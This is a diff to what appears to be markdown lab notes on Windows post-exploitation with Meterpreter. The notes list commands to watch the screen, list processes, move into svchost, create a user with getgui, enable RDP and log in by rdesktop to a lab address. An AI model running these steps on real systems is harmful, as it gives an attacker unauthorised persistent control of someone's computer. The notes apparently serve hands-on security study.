@@ -400,7 +400,8 @@ This exploit uses buffer overflow to get access [more here](https://research.che
 3. `screenshare` -> link generated -> watch in browser -> Ctrl + C to exit
 4.  control the computer
     1.`ps`
-        ```
+
+    ```
         Process List
         ============
 
@@ -432,12 +433,12 @@ This exploit uses buffer overflow to get access [more here](https://research.che
         1540  792   dwm.exe            x64   1        WIN-845Q99OO4PP\Administrator  C:\Windows\system32\Dwm.exe
         1852  440   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
         1892  440   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE
-
-        ```
+    ```
     2. `channel 440` (PPID of svchost)
     4. `getdesktop` -> create a session for remote desctop
     3. `run getgui -u abhiroop -p qwerty` -> make a user
     4. you might need to run "windows/manage/enable_rdp" to enable rdp
         -   `bg` a meterpreter session to shift it to backgroud
         -   `show sessions` to show all running sessions 
+        -   `session <session_id>` to go back to the session you backgrounded
     5. make a new terminal window and `rdesktop -u abhiroop -p qwerty 192.168.110.133` -> now you have remote desktop access
